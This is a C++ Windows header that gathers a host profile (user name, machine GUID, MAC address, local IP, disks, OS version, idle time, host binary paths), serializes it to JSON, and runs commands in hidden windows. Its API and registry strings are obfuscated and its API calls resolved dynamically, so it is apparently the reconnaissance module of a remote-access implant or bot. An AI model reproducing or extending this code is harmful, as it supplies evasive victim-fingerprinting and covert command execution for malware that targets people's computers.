#pragma once
#include <winsock2.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <intrin.h>
#include <array>
#include "stringutils.h"
#include <sstream>
#include <time.h>
#include "pdh.h"
#include "iptypes.h"
#include "thread"
#include "Request.h"
#include <ws2tcpip.h>
#include <chrono>
#include <nlohmann/json.hpp>
using json = nlohmann::json;
// using namespace std::chrono;
typedef NTSYSAPI NTSTATUS (*RtlGetVersion)(PRTL_OSVERSIONINFOW *lpVersionInformation);
typedef void(WINAPI *RtlGetVersion_FUNC)(OSVERSIONINFOEXW *);
void Start();
typedef struct WindowsVersion
{
    int majorVersion;
    int minorVersion;
    int buildNumber;
    int platformId;
    std::string name;
} WindowsVersion;
typedef struct ExecResult
{
    int exitcode;
    int PID;
    std::string result;
} ExecResult;
typedef struct Screen
{
    int width;
    int height;
} Screen;
typedef struct Disk
{
    int64_t freeSpace;
    int64_t total;
    std::string name;
} Disk;
class Information
{
private:
public:
    std::string arch;
    std::string compileTime;
    int cpuCores;
    std::map<std::string, std::string> cpuInfo;
    std::map<std::string, std::string> driveInfo;
    std::map<std::string, std::string> osInfo;
    std::string cpu;
    double cpuPercentage;
    std::vector<Disk> disks;
    std::vector<std::string> dotnetVersions;
    int64_t totalRam;
    int64_t freeRam;
    std::string userName;
    std::string hostBinary;
    bool isInteractive;
    std::string localIp;
    std::string remoteIp;
    std::string machine;
    std::string machineId;
    std::string mainBinary;
    WindowsVersion windowsVersion;
    Screen screen;
    int64_t systemTime;
    int64_t idleTime;
    Information();
    static Information getInformation();
};

WindowsVersion getWindowsVersion();
static DWORD minimum(DWORD one, DWORD two)
{
    return one > two ? two : one;
}
bool IsSystemX64()
{
    SYSTEM_INFO systemInfo = {0};
    GetNativeSystemInfo(&systemInfo);

    // x86 environment
    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        return true;

    return false;
}
std::string GetCpuInfo()
{
    // 4 is essentially hardcoded due to the __cpuid function requirements.
    // NOTE: Results are limited to whatever the sizeof(int) * 4 is...
    std::array<int, 4> integerBuffer = {};
    constexpr size_t sizeofIntegerBuffer = sizeof(int) * integerBuffer.size();

    std::array<char, 64> charBuffer = {};

    // The information you wanna query __cpuid for.
    // https://learn.microsoft.com/en-us/cpp/intrinsics/cpuid-cpuidex?view=vs-2019
    constexpr std::array<unsigned int, 3> functionIds = {
        // Manufacturer
        //  EX: "Intel(R) Core(TM"
        0x8000'0002,
        // Model
        //  EX: ") i7-8700K CPU @"
        0x8000'0003,
        // Clockspeed
        //  EX: " 3.70GHz"
        0x8000'0004};

    std::string cpu;

    for (int id : functionIds)
    {
        // Get the data for the current ID.
        __cpuid(integerBuffer.data(), id);

        // Copy the raw data from the integer buffer into the character buffer
        memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);

        // Copy that data into a std::string
        cpu += std::string(charBuffer.data());
    }

    return cpu;
}

ExecResult StartProcess(std::string file, std::string cmd, int timeoutInSecs = 0, bool *shouldExit = nullptr)
{
    ExecResult result{0};
    result.exitcode = 1;
    std::string strResult;
    std::stringstream ss;
    HANDLE hPipeRead, hPipeWrite;

    SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};
    saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe to get results from child's stdout.
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
    {
        return result;
    }
    cmd = "\"" + file + "\" " + cmd;
    STARTUPINFOA si = {sizeof(STARTUPINFOW)};
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.
    // Requires STARTF_USESHOWWINDOW in dwFlags.

    PROCESS_INFORMATION pi = {0};

    BOOL fSuccess = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!fSuccess)
    {
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        return result;
    }

    bool bProcessEnded = false;
    auto start = std::time(NULL);
    auto now = start;
    for (; !bProcessEnded;)
    {
        // Give some timeslice (50 ms), so we won't waste 100% CPU.
        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;
        if (timeoutInSecs > 0)
        {
            now = std::time(NULL);
            if ((now - timeoutInSecs) > start)
            {
                TerminateProcess(pi.hProcess, 0);
            }
        }
        if ((shouldExit != nullptr && *shouldExit))
        {
            TerminateProcess(pi.hProcess, 0);
        }
        // Even if process exited - we continue reading, if
        // there is some data available over pipe.
        for (;;)
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
                break;

            if (!dwAvail) // No data available, return
                break;

            if (!::ReadFile(hPipeRead, buf, minimum(sizeof(buf) - 1, (DWORD)dwAvail), &dwRead, NULL) || !dwRead)
                // Error, the child process might ended
                break;

            buf[dwRead] = 0;
            ss << buf;
        }
    } // for
    strResult = ss.str();
    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    result.exitcode = code;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    result.result = strResult;
    return result;
}
std::map<std::string, std::string> getWmicResult(std::string cmd)
{
    std::map<std::string, std::string> result;
    std::stringstream ss;

    ss << cmd << " get /format:list";

    auto res = StartProcess("wmic.exe", ss.str(), 0, nullptr);
    auto lines = StringUtils::split(res.result, '\n');

    for (auto &line : lines)
    {
        line = StringUtils::trim(line);
        if (line.size() > 0)
        {
            auto pair = StringUtils::split(line, '=');
            if (pair.size() == 2)
            {
                pair[1] = StringUtils::trim(pair[1]);
                if (pair[1].size() > 0)
                {
                    result[pair[0]] = pair[1];
                }
                // result.insert(pair[0],pair[1]);
            }
        }
    }

    return result;
}
static PDH_HQUERY cpuQuery;
static PDH_HCOUNTER cpuTotal;

void initCPUCounter()
{
    PdhOpenQuery(NULL, NULL, &cpuQuery);
    // You can also use L"\\Processor(*)\\% Processor Time" and get individual CPU values with PdhGetFormattedCounterArray()
    PdhAddEnglishCounter(cpuQuery, "\\Processor(_Total)\\% Processor Time", NULL, &cpuTotal);
    PdhCollectQueryData(cpuQuery);
}

double getCpuPercentage()
{
    PDH_FMT_COUNTERVALUE counterVal;

    PdhCollectQueryData(cpuQuery);
    PdhGetFormattedCounterValue(cpuTotal, PDH_FMT_DOUBLE, NULL, &counterVal);

    return counterVal.doubleValue;
}
std::vector<Disk> getDisks()
{
    std::vector<Disk> disks;

    const int size = 4096;
    char *szDrives = new char[size]();
    if (GetLogicalDriveStringsA(size, szDrives))

        for (int i = 0; i < 100; i += 4)
        {
            if (szDrives[i] != (char)0)
            {
                auto driveLetter = std::string{szDrives[i], szDrives[i + 1], szDrives[i + 2]};

                ULARGE_INTEGER total{0};
                ULARGE_INTEGER free{0};

                if (GetDiskFreeSpaceExA(driveLetter.c_str(), nullptr, &total, &free) != 0)
                {
                    Disk disk;
                    disk.name = driveLetter;
                    disk.freeSpace = (int64_t)(free.QuadPart);
                    disk.total = (int64_t)(total.QuadPart);
                    disks.push_back(disk);
                }
            }
        }
    delete[] szDrives;
    return disks;
}
std::string getUsername()
{
    const DWORD size = 1024;
    const char name[size] = {0};
    std::string user;
    GetUserNameA((LPSTR)name, (LPDWORD)&size);
    user = name;
    return user;
}
std::string GetExecutable()
{
    char path[1024];

    memset(path, 0, sizeof(path));
    DWORD size = sizeof(path);
    auto module = GetModuleHandleA(NULL);
    size = GetModuleFileNameA(module, path, size);
    std::string exe = path;

    return exe;
}

HMODULE GetCurrentModule()
{
    HMODULE hModule = nullptr;
    GetModuleHandleEx(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        reinterpret_cast<LPCTSTR>(GetCurrentModule),
        &hModule);

    return hModule;
}
std::string getExecutingBinary()
{
    char path[1024];

    memset(path, 0, sizeof(path));
    DWORD size = sizeof(path);
    auto module = GetCurrentModule();
    size = GetModuleFileNameA(module, path, size);
    std::string exe = path;

    return exe;
}
BOOL IsUserInteractive()
{
    BOOL bIsUserInteractive = TRUE;

    HWINSTA hWinStation = GetProcessWindowStation();
    if (hWinStation != NULL)
    {
        USEROBJECTFLAGS uof = {0};
        if (GetUserObjectInformation(hWinStation, UOI_FLAGS, &uof, sizeof(USEROBJECTFLAGS), NULL) && ((uof.dwFlags & WSF_VISIBLE) == 0))
        {
            bIsUserInteractive = FALSE;
        }
    }
    return bIsUserInteractive;
}
std::string getLocalIP()
{
    std::string ip;
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) == 0)
    {

        char hostname[NI_MAXHOST];
        if (gethostname(hostname, NI_MAXHOST) != SOCKET_ERROR)
        {
            // std::cerr << "gethostname failed: " << WSAGetLastError() << std::endl;

            struct addrinfo *result = nullptr;
            struct addrinfo hints;

            ZeroMemory(&hints, sizeof(hints));
            hints.ai_family = AF_UNSPEC; // IPv4 or IPv6
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_protocol = IPPROTO_TCP;

            if (getaddrinfo(hostname, nullptr, &hints, &result) == 0)
            {

                char ipstr[INET6_ADDRSTRLEN];

                // Iterate through addresses and print IP address
                for (struct addrinfo *ptr = result; ptr != nullptr; ptr = ptr->ai_next)
                {
                    void *addr;
                    if (ptr->ai_family == AF_INET)
                    { // IPv4
                        struct sockaddr_in *ipv4 = reinterpret_cast<struct sockaddr_in *>(ptr->ai_addr);
                        addr = &(ipv4->sin_addr);
                    }
                    else
                    { // IPv6
                        continue;
                        // struct sockaddr_in6 *ipv6 = reinterpret_cast<struct sockaddr_in6 *>(ptr->ai_addr);
                        // addr = &(ipv6->sin6_addr);
                    }

                    inet_ntop(ptr->ai_family, addr, ipstr, sizeof(ipstr));
                    if (strlen(ipstr) > 0)
                    {
                        ip = ipstr;
                        break;
                    }
                    std::cout << "Local IP address: " << ipstr << std::endl;
                }

                freeaddrinfo(result);
            }
        }
    }
    WSACleanup();
    return ip;
}
std::string getMachineName()
{
    std::string machine;

    char buff[1024];
    DWORD size = sizeof(buff);
    GetComputerNameA(buff, &size);
    machine = buff;

    return machine;
}
std::string GetStringValueFromHKLM(const std::string &regSubKey, const std::string &regValue)
{
    size_t bufferSize = 4096; // If too small, will be resized down below.
    std::string valueBuf;     // Contiguous buffer since C++11.
    valueBuf.resize(bufferSize);
    auto cbData = static_cast<DWORD>(bufferSize * sizeof(char));

    HMODULE mod = LoadLibrary(OBFUSCATED("Advapi32"));
    // typedef void (*C2ustomFreeLibraryFunc)(HCUSTOMMODULE, void *);
    typedef LSTATUS(__stdcall * ProcRegGetValueA)(HKEY hkey, LPCSTR lpSubKey, LPCSTR lpValue, DWORD dwFlags, LPDWORD pdwType, PVOID pvData, LPDWORD pcbData);

    auto RegGetValueAProc = (ProcRegGetValueA)GetProcAddress(mod, OBFUSCATED("RegGetValueA"));

    auto rc = RegGetValueAProc(
        HKEY_LOCAL_MACHINE,
        regSubKey.c_str(),
        regValue.c_str(),
        RRF_RT_REG_SZ,
        nullptr,
        (void *)&valueBuf[0],
        &cbData);
    while (rc == ERROR_MORE_DATA)
    {
        // Get a buffer that is big enough.
        // cbData /= sizeof(wchar_t);
        if (cbData > static_cast<DWORD>(bufferSize))
        {
            bufferSize = static_cast<size_t>(cbData);
        }
        else
        {
            bufferSize *= 2;
            cbData = static_cast<DWORD>(bufferSize);
        }
        valueBuf.resize(bufferSize);
        rc = RegGetValueAProc(
            HKEY_LOCAL_MACHINE,
            regSubKey.c_str(),
            regValue.c_str(),
            RRF_RT_REG_SZ,
            nullptr,
            (void *)&valueBuf[0],
            &cbData);
    }
    if (rc == ERROR_SUCCESS)
    {
        valueBuf.resize(static_cast<size_t>(cbData - 1)); // remove end null character
        return valueBuf;
    }
    else
    {
        throw std::runtime_error(OBFUSCATED("Windows system error code: ") + std::to_string(rc));
    }
}
std::string GetMac()
{
    string result = "";
    IP_ADAPTER_INFO AdapterInfo[32];
    DWORD dwBufLen = sizeof(AdapterInfo);

    HMODULE mod = LoadLibrary(OBFUSCATED("Iphlpapi"));
    // typedef void (*C2ustomFreeLibraryFunc)(HCUSTOMMODULE, void *);
    typedef ULONG(__stdcall * ProcGetAdaptersInfo)(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);

    auto GetAdaptersInfoProc = (ProcGetAdaptersInfo)GetProcAddress(mod, OBFUSCATED("GetAdaptersInfo"));
    DWORD dwStatus = GetAdaptersInfoProc(AdapterInfo, &dwBufLen);
    if (dwStatus == ERROR_SUCCESS)
    {
        char buff[4];
        for (int i = 0; i < (int)AdapterInfo->AddressLength; i++)
        {
            WORD character = (WORD)AdapterInfo->Address[i];
            _itoa((WORD)character, buff, 16);
            if (strlen(buff) == 1)
            {
                buff[2] = 0;
                buff[1] = buff[0];
                buff[0] = '0';
            }

            for (int x = 0; x < strlen(buff); x++)
                buff[x] = toupper(buff[x]);

            result.append(buff);
            // if (i < (AdapterInfo->AddressLength - 1))
            //     result.append("-");
        }
    }

    return result;
}
std::string GetMachineID()
{
    std::string _machineID = "";

    std::string regKeyString = OBFUSCATED("SOFTWARE\\Microsoft\\Cryptography");
    std::string regValueString = OBFUSCATED("MachineGuid");

    std::string valueFromRegistry;
    try
    {
        valueFromRegistry = GetStringValueFromHKLM(regKeyString, regValueString);
        _machineID = valueFromRegistry;
    }
    catch (std::exception &e)
    {
        std::cerr << e.what();
    }

    if (_machineID.size() == 0)
    {
        _machineID = GetMac();
    }

    return _machineID;
}
WindowsVersion getWindowsVersion()
{
    WindowsVersion version;
    HMODULE hMod;
    OSVERSIONINFOEX osV;
    OSVERSIONINFOEX *os = &osV;
    RtlGetVersion_FUNC func;
#ifdef UNICODE
    OSVERSIONINFOEXW *osw = os;
#else
    OSVERSIONINFOEXW o;
    OSVERSIONINFOEXW *osw = &o;
#endif

    hMod = LoadLibrary(TEXT("ntdll.dll"));
    if (hMod)
    {
        func = (RtlGetVersion_FUNC)GetProcAddress(hMod, "RtlGetVersion");
        if (func != 0)
        {

            ZeroMemory(osw, sizeof(*osw));
            osw->dwOSVersionInfoSize = sizeof(*osw);
            func(osw);
#ifndef UNICODE
            os->dwBuildNumber = osw->dwBuildNumber;
            os->dwMajorVersion = osw->dwMajorVersion;
            os->dwMinorVersion = osw->dwMinorVersion;
            os->dwPlatformId = osw->dwPlatformId;
            os->dwOSVersionInfoSize = sizeof(*os);
            DWORD sz = sizeof(os->szCSDVersion);
            WCHAR *src = osw->szCSDVersion;
            unsigned char *dtc = (unsigned char *)os->szCSDVersion;
            while (*src)
                *dtc++ = (unsigned char)*src++;
            *dtc = '\0';
#endif
            version.buildNumber = os->dwBuildNumber;
            version.majorVersion = os->dwMajorVersion;
            version.minorVersion = os->dwMinorVersion;
            version.platformId = os->dwPlatformId;
            try
            {
                auto versName = GetStringValueFromHKLM(OBFUSCATED(R"(SOFTWARE\Microsoft\Windows NT\CurrentVersion)"), "ProductName");
                version.name = versName;
            }
            catch (std::exception &e)
            {
                std::cerr << e.what();
            }
        }
    }
    return version;
}
Screen getScreenDimensions()
{
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    Screen screen{
        width, height};

    return screen;
}
int64_t getSystemTime()
{
    auto now = std::chrono::system_clock::now();
    auto epoch = std::chrono::duration_cast<std::chrono::seconds>(
                     now.time_since_epoch())
                     .count();
    return epoch;
}

std::string getCompileTime()
{
    std::string compTime = __DATE__;
    compTime += " ";
    compTime += __TIME__;
    return compTime;
}

std::string Information2JSON(Information info)
{
    std::string infoStr;
    json jsn;
    jsn["arch"] = info.arch;
    jsn["compileTime"] = info.compileTime;
    jsn["cpu"] = info.cpu;
    jsn["cpuCores"] = info.cpuCores;
    jsn["cpuInfo"] = info.cpuInfo;

    auto diskArr = json::array();
    for (size_t i = 0; i < info.disks.size(); i++)
    {
        auto disk = info.disks[i];
        diskArr.push_back({
            {"name", disk.name},
            {"freeSpace", disk.freeSpace},
            {"total", disk.total},
        });
    }
    jsn["disks"] = diskArr;

    jsn[OBFUSCATED("dotnetVersions")] = info.dotnetVersions;
    jsn["driveInfo"] = info.driveInfo;
    jsn["freeRam"] = info.freeRam;
    jsn["hostBinary"] = info.hostBinary;
    jsn["isInteractive"] = info.isInteractive;
    jsn["localIp"] = info.localIp;
    jsn["machine"] = info.machine;
    jsn["machineId"] = info.machineId;
    jsn["mainBinary"] = info.mainBinary;
    jsn["osInfo"] = info.osInfo;
    jsn["remoteIp"] = info.remoteIp;
    jsn["screen"] = {
        {"width", info.screen.width},
        {"height", info.screen.height}};
    jsn["systemTime"] = info.systemTime;
    jsn["totalRam"] = info.totalRam;
    jsn["userName"] = info.userName;
    jsn["idleTime"] = info.idleTime;
    jsn["windowsVersion"] = {
        {"buildNumber", info.windowsVersion.buildNumber},
        {"majorVersion", info.windowsVersion.majorVersion},
        {"minorVersion", info.windowsVersion.minorVersion},
        {"platformId", info.windowsVersion.platformId},
        {"name", info.windowsVersion.name},
    };
    ;

    infoStr = jsn.dump(4);
    return infoStr;
}